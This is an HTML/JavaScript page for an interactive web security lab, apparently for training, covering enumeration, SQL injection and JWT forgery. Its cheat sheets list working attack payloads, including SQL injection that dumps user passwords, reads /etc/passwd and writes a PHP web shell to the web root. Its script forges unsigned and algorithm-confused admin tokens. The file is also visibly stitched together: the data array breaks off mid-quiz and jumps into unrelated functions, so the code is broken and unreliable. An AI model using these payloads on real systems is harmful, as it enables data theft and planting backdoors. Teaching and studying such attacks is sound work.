<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>BLACKVAULT // Web Security Labs</title>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
:root{--void:#050706;--panel:#0b0f0d;--panel2:#101512;--bone:#e9e7dc;--ash:#878d85;--blood:#fb3640;--volt:#2de2e6;--amber:#f4b740;--line:rgba(233,231,220,.13);--grot:"Space Grotesk",-apple-system,sans-serif;--mono:"Space Mono",monospace;}
*{box-sizing:border-box;margin:0;padding:0}
html,body{background:var(--void);color:var(--bone);font-family:var(--grot);font-size:15px;line-height:1.55;-webkit-font-smoothing:antialiased}
body{background-image:linear-gradient(rgba(45,226,230,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(45,226,230,.025) 1px,transparent 1px);background-size:44px 44px;min-height:100vh}
body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:9;background:repeating-linear-gradient(0deg,rgba(0,0,0,.18) 0 1px,transparent 1px 3px);opacity:.3}
::selection{background:var(--blood);color:var(--void)}
.topbar{position:sticky;top:0;z-index:20;background:rgba(5,7,6,.94);backdrop-filter:blur(6px);border-bottom:2px solid var(--bone)}
.topbar__in{max-width:1200px;margin:0 auto;padding:12px 20px;display:flex;align-items:center;gap:16px;flex-wrap:wrap}
.brand{display:flex;align-items:baseline;gap:10px;cursor:pointer;user-select:none}
.brand b{font-weight:700;font-size:20px;letter-spacing:-.02em}.brand b i{color:var(--blood);font-style:normal}
.brand span{font-family:var(--mono);font-size:10px;letter-spacing:.32em;color:var(--ash);text-transform:uppercase}
.nav{display:flex;gap:4px;flex-wrap:wrap;margin-left:auto}
.nav button{font-family:var(--mono);font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--ash);background:transparent;border:1.5px solid transparent;padding:7px 11px;cursor:pointer;transition:.12s}
.nav button:hover{color:var(--bone);border-color:var(--line)}
.nav button[aria-current]{color:var(--void);background:var(--bone);border-color:var(--bone)}
.meter{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:10px;color:var(--ash);letter-spacing:.1em}
.meter__bar{width:80px;height:7px;border:1.5px solid var(--bone);position:relative}
.meter__fill{position:absolute;inset:0;width:0%;background:var(--blood);transition:width .5s}
main{max-width:1200px;margin:0 auto;padding:28px 20px 90px}
.spine{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:24px}
.node{background:var(--panel);border:2px solid var(--line);padding:16px;cursor:pointer;transition:.14s;position:relative;overflow:hidden;min-height:130px;display:flex;flex-direction:column}
.node:hover{transform:translateY(-3px);border-color:var(--bone);box-shadow:6px 6px 0 rgba(45,226,230,.28)}
.node::before{content:"";position:absolute;left:0;top:0;bottom:0;width:4px;background:var(--accent,var(--ash))}
.node__n{font-family:var(--mono);font-size:11px;color:var(--ash);letter-spacing:.18em}
.node__t{font-weight:600;font-size:17px;margin:5px 0 6px;line-height:1.12}
.node__tag{font-size:11.5px;color:var(--ash);line-height:1.5;margin-top:auto}
.node__bar{height:5px;border:1.5px solid var(--line);margin-top:10px;position:relative}
.node__bar i{position:absolute;inset:0;width:0%;background:var(--accent,var(--ash));transition:width .5s}
.labpill{position:absolute;top:12px;right:12px;font-family:var(--mono);font-size:9px;letter-spacing:.14em;text-transform:uppercase;background:var(--blood);color:var(--void);padding:2px 6px}
.chip{font-family:var(--mono);font-size:10px;letter-spacing:.12em;text-transform:uppercase;padding:2px 7px;border:1.5px solid;display:inline-block}
.t-WEB{color:var(--volt);border-color:var(--volt)}.t-AUTH{color:var(--amber);border-color:var(--amber)}
.t-IJ{color:var(--blood);border-color:var(--blood)}.t-IS{color:#60a5fa;border-color:#60a5fa}
.crumb{font-family:var(--mono);font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--ash);margin-bottom:16px;display:flex;gap:10px;align-items:center;flex-wrap:wrap}
.crumb a{cursor:pointer;color:var(--volt)}
.ph{border-bottom:2px solid var(--bone);padding-bottom:14px;margin-bottom:20px;display:flex;align-items:flex-end;justify-content:space-between;gap:14px;flex-wrap:wrap}
.ph__t{font-weight:700;font-size:clamp(22px,4vw,36px);letter-spacing:-.03em;line-height:1.05}
.ph__sub{color:var(--ash);font-size:13px;margin-top:5px}
.tabrow{display:flex;gap:0;border-bottom:2px solid var(--line);margin-bottom:22px}
.tabrow button{font-family:var(--mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;background:transparent;color:var(--ash);border:none;border-bottom:3px solid transparent;padding:10px 16px;cursor:pointer;transition:.12s;margin-bottom:-2px}
.tabrow button[aria-current]{color:var(--bone);border-bottom-color:var(--accent,var(--blood))}
.tabrow button:hover{color:var(--bone)}
.labshell{background:var(--panel);border:2px solid var(--bone);box-shadow:8px 8px 0 var(--blood)}
.labbar{background:rgba(0,0,0,.5);border-bottom:1px solid var(--line);padding:10px 16px;display:flex;align-items:center;gap:10px;font-family:var(--mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:var(--ash)}
.d2{width:10px;height:10px;border-radius:50%;display:inline-block;margin-right:2px}
.r{color:#f87171}.g{color:#4ade80}.a{color:#fbbf24}.b{color:#60a5fa}.v{color:#2de2e6}.dim{color:#444}
.dr{background:#f87171}.dy{background:#fbbf24}.dg{background:#4ade80}
.labinner{padding:18px;display:grid;gap:14px}
.labinner.two{grid-template-columns:1fr 1fr}
.term{background:#000;border:1px solid #1a1a1a;padding:14px;font-family:var(--mono);font-size:12px;color:#aaa;line-height:1.8;min-height:160px;overflow-y:auto;max-height:360px;white-space:pre-wrap}
.fieldlabel{font-family:var(--mono);font-size:10px;letter-spacing:.16em;text-transform:uppercase;color:var(--ash);margin-bottom:5px;display:block}
.field{width:100%;font-family:var(--mono);font-size:13px;background:#0d0d0d;color:var(--bone);border:1.5px solid #333;padding:9px 12px;outline:none;transition:border .12s}
.field:focus{border-color:var(--volt)}
select.field option{background:#0d0d0d}
textarea.field{resize:vertical;line-height:1.6;min-height:80px}
.btn{font-family:var(--mono);font-size:12px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;background:var(--bone);color:var(--void);border:2px solid var(--bone);padding:9px 14px;box-shadow:4px 4px 0 var(--blood);transition:.12s;white-space:nowrap}
.btn:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 var(--blood)}
.btn:active{transform:translate(2px,2px);box-shadow:2px 2px 0 var(--blood)}
.btn--sm{padding:6px 10px;font-size:11px;box-shadow:3px 3px 0 var(--blood)}
.btn--g{background:transparent;color:var(--volt);border-color:var(--volt);box-shadow:4px 4px 0 rgba(45,226,230,.4)}
.btn--g:hover{background:var(--volt);color:var(--void)}
.btn--r{background:var(--blood);color:var(--void);border-color:var(--blood);box-shadow:4px 4px 0 rgba(251,54,64,.4)}
.btn--a{background:transparent;color:var(--amber);border-color:var(--amber);box-shadow:4px 4px 0 rgba(244,183,64,.3)}
.btn--a:hover{background:var(--amber);color:var(--void)}
.btnrow{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
.panel{background:var(--panel2);border:1px solid var(--line);padding:14px 16px}
.panel.danger{border-color:var(--blood)}.panel.safe{border-color:#4ade80}.panel.warn{border-color:var(--amber)}
.panel h4{font-family:var(--mono);font-size:10px;letter-spacing:.16em;text-transform:uppercase;color:var(--ash);margin-bottom:8px}
.tag{display:inline-block;font-family:var(--mono);font-size:10px;padding:2px 7px;font-weight:600;margin:2px}
.tag-r{background:#3a1515;color:#f87171}.tag-g{background:#0f2a1a;color:#4ade80}
.tag-a{background:#2a1d0a;color:#fbbf24}.tag-b{background:#0d1f3a;color:#60a5fa}
.httppane{display:grid;grid-template-columns:1fr 1fr;border:1px solid var(--line)}
.httppane__h{background:#0a0f0e;border-bottom:1px solid var(--line);padding:6px 12px;font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--ash)}
.httppane__b{font-family:var(--mono);font-size:12px;padding:12px;background:#000;min-height:120px;white-space:pre-wrap;color:#aaa;line-height:1.7}
.cheat{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px}
.cheat__item{border-left:3px solid var(--accent,var(--volt));background:var(--panel);padding:10px 14px}
.cheat__item code{font-family:var(--mono);font-size:12px;color:var(--volt);background:#0d0f0d;padding:2px 6px;cursor:pointer;display:inline-block;margin:2px 0}
.cheat__item code:hover{background:var(--volt);color:var(--void)}
.cheat__item p{font-size:13px;color:var(--ash);margin:4px 0 0}
.qcard{border:2px solid var(--line);background:var(--panel);padding:18px 20px;margin-bottom:14px}
.qcard__n{font-family:var(--mono);font-size:10px;letter-spacing:.18em;text-transform:uppercase;color:var(--ash);margin-bottom:8px}
.qcard__q{font-weight:600;font-size:16px;margin:0 0 13px;line-height:1.3}
.opt{display:block;width:100%;text-align:left;font-family:var(--grot);font-size:14px;color:var(--bone);background:var(--panel2);border:1.5px solid var(--line);padding:10px 14px;margin-bottom:7px;cursor:pointer;transition:.1s}
.opt:hover:not(:disabled){border-color:var(--bone)}.opt:disabled{cursor:default}
.opt[data-s=correct]{border-color:var(--amber);background:rgba(244,183,64,.1)}
.opt[data-s=wrong]{border-color:var(--blood);background:rgba(251,54,64,.09)}
.explain{font-size:13px;color:var(--ash);border-left:3px solid var(--amber);padding:8px 0 8px 14px;margin-top:4px}
.explain b{color:var(--amber);font-family:var(--mono);font-size:10px;letter-spacing:.12em;text-transform:uppercase;display:block;margin-bottom:2px}
.score{font-family:var(--mono);border:2px solid var(--bone);padding:12px 16px;margin-bottom:18px;display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap}
.score b{font-size:22px;color:var(--blood)}
.miniretry{font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;background:transparent;color:var(--volt);border:1.5px solid var(--volt);padding:5px 9px}
.miniretry:hover{background:var(--volt);color:var(--void)}
.casenode{border:2px solid var(--bone);background:var(--panel);padding:22px 24px;box-shadow:7px 7px 0 var(--blood)}
.clock{font-family:var(--mono);font-size:12px;letter-spacing:.16em;color:var(--blood)}
.choice{display:block;width:100%;text-align:left;font-size:14px;color:var(--bone);background:var(--panel2);border:1.5px solid var(--line);padding:12px 16px;margin-top:9px;cursor:pointer;transition:.1s}
.choice:hover{border-color:var(--volt);transform:translateX(3px)}
.fb{border-left:3px solid;padding:10px 0 10px 14px;margin-top:14px;font-size:14px}
.fb-g{border-color:var(--amber)}.fb-g b,.fb-b b{font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:2px}
.fb-g b{color:var(--amber)}.fb-b{border-color:var(--blood)}.fb-b b{color:var(--blood)}
.h1{font-size:clamp(26px,5vw,44px);font-weight:700;letter-spacing:-.03em;line-height:1.02;margin:8px 0 0}
.lede{color:var(--ash);max-width:64ch;margin:12px 0 0;font-size:15px}
.eyebrow{font-family:var(--mono);font-size:11px;letter-spacing:.3em;text-transform:uppercase;color:var(--volt)}
.toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%) translateY(20px);opacity:0;background:var(--bone);color:var(--void);font-family:var(--mono);font-size:12px;letter-spacing:.08em;text-transform:uppercase;padding:9px 16px;border:2px solid var(--void);z-index:50;transition:.25s;pointer-events:none}
.toast[data-show]{opacity:1;transform:translateX(-50%) translateY(0)}
footer{max-width:1200px;margin:0 auto;padding:24px 20px 40px;border-top:1px solid var(--line);font-family:var(--mono);font-size:11px;letter-spacing:.08em;color:var(--ash);display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
@media(max-width:800px){.spine{grid-template-columns:1fr 1fr}.labinner.two{grid-template-columns:1fr}.httppane{grid-template-columns:1fr}}
@media(max-width:520px){.spine{grid-template-columns:1fr}}
.codesplit{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:10px}
.codecard{background:var(--panel2);border:1px solid var(--line);display:flex;flex-direction:column}
.codecard.vuln{border-top:3px solid var(--blood)}
.codecard.secure{border-top:3px solid var(--volt)}
.codecard__header{padding:6px 12px;background:rgba(0,0,0,.3);border-bottom:1px solid var(--line);font-family:var(--mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;display:flex;justify-content:space-between}
.codecard__body{padding:12px;overflow-x:auto;font-family:var(--mono);font-size:12.5px;line-height:1.5;color:#ccc;white-space:pre}
.dd-section{margin-bottom:20px}
.dd-section h3{font-family:var(--grot);font-size:17px;font-weight:600;margin-bottom:8px;border-bottom:1px solid var(--line);padding-bottom:4px}
.dd-section p{font-size:14px;color:var(--ash);line-height:1.6}
@media(max-width:800px){.codesplit{grid-template-columns:1fr}}

</style></head>
<body>
<div class="topbar"><div class="topbar__in">
  <div class="brand" id="brandBtn"><b>BLACK<i>VAULT</i></b><span>Web Security Labs</span></div>
  <div class="meter"><span>XP</span><div class="meter__bar"><div class="meter__fill" id="mf"></div></div><span id="mp">0%</span></div>
  <nav class="nav" id="nav">
    <button id="nb-map">Map</button>
    <button id="nb-quiz">Quiz</button>
    <button id="nb-case">Cases</button>
    <button id="nb-ref">Reference</button>
  </nav>
</div></div>
<main id="app"></main>
<footer><span>BLACKVAULT // interactive web security lab</span><span id="fstat">xp saved locally</span></footer>
<div class="toast" id="toast"></div>
<script>
/* ── STATE ── */
const S={view:'map',phase:null,tab:'lab',quizPool:[],quizState:[],caseId:null,caseNode:0,
  xp:JSON.parse(localStorage.getItem('bv_xp')||'{}')};
function saveXP(){localStorage.setItem('bv_xp',JSON.stringify(S.xp));}
function addXP(id,pts=10){if(!S.xp[id]){S.xp[id]=pts;saveXP();updateMeter();toast('+'+pts+' XP');}}
function totalXP(){return Object.values(S.xp).reduce((a,v)=>a+v,0);}
function maxXP(){return PHASES.length*60;}
function updateMeter(){const p=Math.min(100,Math.round(totalXP()/maxXP()*100));document.getElementById('mf').style.width=p+'%';document.getElementById('mp').textContent=p+'%';}
function toast(m){const t=document.getElementById('toast');t.textContent=m;t.dataset.show=1;setTimeout(()=>delete t.dataset.show,2000);}
function cp(el){navigator.clipboard?.writeText(el.textContent.trim());toast('Copied!');}

/* ── PHASES DATA ── */
const accentMap={WEB:'var(--volt)',AUTH:'var(--amber)',IJ:'var(--blood)',IS:'#60a5fa'};
const PHASES=[

  {
    "n": 1,
    "id": "enum",
    "title": "Web Enumeration",
    "tracks": [
      "WEB"
    ],
    "tag": "passive OSINT \u00b7 dir brute \u00b7 tech fingerprint \u00b7 subdomains",
    "tip": "You cannot exploit what you have not enumerated.",
    "labType": "scanner",
    "deepDive": {
      "mechanics": "Web Enumeration is the systematic process of mapping out an application's attack surface. This includes directory brute-forcing, subdomain discovery, technology stack fingerprinting, and examining publicly exposed files. Attackers search for leftover files like <code>.git/HEAD</code>, <code>.env</code> configurations, backup archives (e.g., <code>backup.zip</code>), and open API documentations. Standard scanners send HTTP requests and analyze response status codes (e.g., 200, 403, 404) and headers to determine if hidden routes or administrative portals exist.",
      "impact": "Exposing technology versions allows attackers to lookup matched public CVEs (e.g., Apache path traversal RCEs). Disclosing environment configurations exposes database credentials, API secrets, and encryption keys. Exposed Git directories allow reconstruction of the entire application source code, revealing hidden endpoints and vulnerabilities.",
      "vulnerableCode": "# Apache configuration leaking server version signature\nServerTokens Full\nServerSignature On\n\n# Or a basic Express setup exposing sensitive config folder\napp.use('/config', express.static('config'));",
      "secureCode": "# Secure Apache config hiding stack details\nServerTokens Prod\nServerSignature Off\n\n# Explicitly restrict dotfiles and config directories\nRedirectMatch 404 /\\.(git|env)$\n# Keep configuration files entirely outside web server root",
      "lang": "apache"
    },
    "cheat": [
      {
        "title": "Passive \u2014 zero packets",
        "cmd": "curl \"https://crt.sh/?q=%.target.com&output=json\" | jq \".[].name_value\"",
        "note": "Certificate transparency \u2014 finds every subdomain ever issued a cert"
      },
      {
        "title": "Dir brute force",
        "cmd": "gobuster dir -u https://target.com -w raft-medium-directories.txt -x php,bak,zip,env",
        "note": "Always include -x bak,zip,env \u2014 backup files are critical"
      },
      {
        "title": "Tech fingerprint",
        "cmd": "whatweb -a 3 https://target.com -v",
        "note": "Stack \u2192 CVE list. X-Powered-By header alone leaks PHP version"
      },
      {
        "title": "High-value quick wins",
        "cmd": "curl -sI https://target.com | grep -iE \"server:|x-powered-by:\"",
        "note": "Check /.git/HEAD /.env /backup.zip /phpinfo.php /swagger.json before full wordlists"
      },
      {
        "title": "Subdomain enum",
        "cmd": "subfinder -d target.com -all -recursive -o subs.txt",
        "note": "Forgotten dev/staging subdomains are often the real entry point"
      },
      {
        "title": "403 bypass",
        "cmd": "curl -H \"X-Original-URL: /admin\" https://target.com/",
        "note": "403 means resource EXISTS. Try path tricks, verb confusion, X-Original-URL"
      }
    ],
    "quiz": [
      {
        "q": "You find dev.target.com via crt.sh returning Apache/2.2 in headers. Best next step:",
        "o": [
          "Ignore \u2014 dev server",
          "searchsploit Apache 2.2 and map CVEs",
          "Run nikto immediately",
          "Report informational"
        ],
        "a": 1,
        "e": "Old stack on a forgotten dev subdomain is a prime target for publicly documented RCE exploits."
      },
      {
        "q": "A gobuster scan returns 403 Forbidden for /admin. This implies:",
        "o": [
          "Path does not exist",
          "Web server blocked it; path exists",
          "Firewall dropped connection",
          "Folder is empty"
        ],
        "a": 1,
        "e": "403 confirms the resource exists but requires auth. Target it with header bypasses like X-Forwarded-For or X-Custom-IP-Authorization."
      },
      {
        "q": "You find a /.git/ folder on target. Best tool to reconstruct source:",
        "o": [
          "git clone target.com/.git",
          "wget -r target.com/.git",
          "git-dumper target.com/.git/ ./out",
          "curl target.com/.git/HEAD"
        ],
        "a": 2,
        "e": "Directory listing is usually disabled. git-dumper systematically downloads HEAD, objects, index, and logs to rebuild code locally."
      }
    ]
  },
  {
    "n": 2,
    "id": "sqli",
    "title": "SQL Injection",
    "tracks": [
      "IJ"
    ],
    "tag": "UNION-based \u00b7 Boolean-based \u00b7 Time-based \u00b7 Error-based",
    "tip": "SQLi allows command injection directly into backend databases.",
    "labType": "sqli",
    "deepDive": {
      "mechanics": "SQL Injection (SQLi) occurs when user-supplied input is directly concatenated into SQL query strings instead of using parameterized inputs. Because the database engine compiles the input as SQL syntax rather than treating it as raw data, attackers can append database commands. In a UNION-based injection, attackers merge query results with the output of another table. In blind injections, they extract data byte-by-byte using boolean logic (observing page content changes) or timing delays (observing query execution time).",
      "impact": "Complete data exfiltration (credit cards, PII, passwords), authentication bypass, database destruction, and in some configurations (e.g., xp_cmdshell on MSSQL or load_file/into outfile on MySQL), complete Remote Code Execution on the host system.",
      "vulnerableCode": "# Vulnerable Python code concatenating raw parameters\nquery = f\"SELECT * FROM products WHERE name = '{input}' AND public = 1\"\ncursor.execute(query)",
      "secureCode": "# Secure parameterized query binding parameters as data\nquery = \"SELECT * FROM products WHERE name = %s AND public = 1\"\ncursor.execute(query, (input,))",
      "lang": "python"
    },
    "cheat": [
      {
        "title": "UNION column fingerprinting",
        "cmd": "Keyboard' ORDER BY 1-- / Keyboard' ORDER BY 2--",
        "note": "Increment until error to determine the exact number of active query columns"
      },
      {
        "title": "UNION select payload",
        "cmd": "Keyboard' UNION SELECT null, username, password FROM users--",
        "note": "Match database columns and extract usernames and passwords"
      },
      {
        "title": "Extract MySQL DB version",
        "cmd": "Keyboard' UNION SELECT null, @@version, null--",
        "note": "Get target database software version details"
      },
      {
        "title": "Blind Time-based trigger",
        "cmd": "Keyboard' OR IF(1=1, SLEEP(5), 0)--",
        "note": "Forces a 5-second delay if condition is true; useful for data exfiltration without errors/outputs"
      },
      {
        "title": "Read local server file",
        "cmd": "Keyboard' UNION SELECT null, LOAD_FILE('/etc/passwd'), null--",
        "note": "If file privilege is enabled, reads server operating system files"
      },
      {
        "title": "Write local web shell",
        "cmd": "Keyboard' UNION SELECT null, '<?php system($_GET[0]); ?>', null INTO OUTFILE '/var/www/html/shell.php'--",
        "note": "Writes back-door directly to server directory for instant remote access"
      }
    ],
    "quiz": [
      {
        "q": "An application replaces ' with '' (SQL escaping) but input is integer based: SELECT * FROM items WHERE id = $input. You inject:",

window.decodeJWT=function(){
  const t=(document.getElementById('jwt-in').value||'').trim();
  const parts=t.split('.');
  if(parts.length<2){document.getElementById('jwt-out').textContent='Invalid JWT format';return;}
  const dec=s=>{try{return JSON.stringify(JSON.parse(atob(s.replace(/-/g,'+').replace(/_/g,'/'))),null,2);}catch{return 'decode error';}};
  document.getElementById('jwt-header').innerHTML=`<span class="a">${dec(parts[0])}</span>`;
  document.getElementById('jwt-payload').innerHTML=`<span class="g">${dec(parts[1])}</span>`;
  document.getElementById('jwt-out').textContent='Token decoded. Now run an attack.';
  addXP('jwt_decode',5);
};
window.jwtAttack=function(type){
  const t=(document.getElementById('jwt-in').value||'').trim();
  const parts=t.split('.');
  const dec=s=>{try{return JSON.parse(atob(s.replace(/-/g,'+').replace(/_/g,'/')));}catch{return {};}};
  const enc=o=>btoa(JSON.stringify(o)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
  const out=document.getElementById('jwt-out');
  const res=document.getElementById('jwt-result');
  if(type==='none'){
    const hdr={alg:'none',typ:'JWT'};
    const pay=dec(parts[1]||''); pay.role='admin'; pay.sub='admin_1';
    const forged=enc(hdr)+'.'+enc(pay)+'.';
    out.innerHTML=`<span class="r">ATTACK: alg:none</span>\n<span class="dim">────────────────────────────</span>\n<span class="a">Forged token (no signature):</span>\n<span class="v">${forged}</span>\n\n<span class="g">→ Server accepts if it doesn't enforce algorithm</span>\n<span class="r">→ Role claim changed to: admin</span>`;
    res.innerHTML=`<div class="panel danger"><h4>What happened</h4><p style="font-size:13px">Algorithm set to "none" + signature stripped. Role elevated to admin. If server accepts: <b>full authentication bypass</b>. Fix: hardcode expected algorithm server-side — never read alg from token.</p></div>`;
    addXP('jwt_none',20);
  } else if(type==='confusion'){
    const hdr={alg:'HS256',typ:'JWT'};
    const pay=dec(parts[1]||''); pay.role='admin';
    const forged=enc(hdr)+'.'+enc(pay)+'.HMAC_SIGNED_WITH_SERVER_PUBLIC_KEY';
    out.innerHTML=`<span class="r">ATTACK: RS256 → HS256 Algorithm Confusion</span>\n<span class="dim">────────────────────────────────────────</span>\n<span class="a">1. Fetch public key from /.well-known/jwks.json</span>\n<span class="a">2. Change alg: RS256 → HS256</span>\n<span class="a">3. Sign with public key bytes as HMAC secret</span>\n\n<span class="v">Forged: ${forged}</span>\n\n<span class="g">→ If library mishandles alg switch, verification</span>\n<span class="g">  uses public key as HMAC secret — it matches!</span>`;
    res.innerHTML=`<div class="panel danger"><h4>Why it works</h4><p style="font-size:13px">RS256 uses asymmetric keys. HS256 uses symmetric. If you tell the library to verify as HS256, it expects a symmetric secret. You provide the server's PUBLIC KEY (which is public!). The library computes HMAC-SHA256(header.payload, publicKey) and verifies — it matches what you signed. Fix: Never allow the token to specify the algorithm.</p></div>`;
    addXP('jwt_confusion',25);
  } else if(type==='edit'){
    const pay=dec(parts[1]||''); const orig=JSON.stringify(pay);
    pay.role='admin'; pay.sub='admin_1'; pay.exp=Math.floor(Date.now()/1000)+86400*365;
    out.innerHTML=`<span class="a">EDIT CLAIMS</span>\n<span class="dim">─────────────</span>\n<span class="r">Before: ${orig}</span>\n<span class="g">After:  ${JSON.stringify(pay)}</span>\n\n<span class="a">New payload: ${enc(pay)}</span>\n\n<span class="dim">Note: signature is now invalid unless you know the secret</span>\n<span class="dim">→ Combine with alg:none or algorithm confusion to forge valid signature</span>`;
    addXP('jwt_edit',10);
  }
};

}
window.pickCase=function(i){
  const cas=CASES.find(c=>c.id===S.caseId);const node=cas.nodes[S.caseNode];const ok=i===node.correct;
  if(ok)addXP('case_'+S.caseId+'_'+S.caseNode,25);
  document.querySelectorAll('.choice').forEach(b=>b.disabled=true);
  document.getElementById('casefb').innerHTML=`<div class="fb fb-${ok?'g':'b'}" style="margin-top:14px"><b>${ok?'CORRECT':'WRONG'}</b>${ok?node.fb.good:node.fb.bad}</div>
  <button class="btn" style="margin-top:14px" onclick="go('case',{caseId:'${S.caseId}',caseNode:${S.caseNode+1}})">${S.caseNode+1<cas.nodes.length?'Next Step →':'Close Case'}</button>`;
};
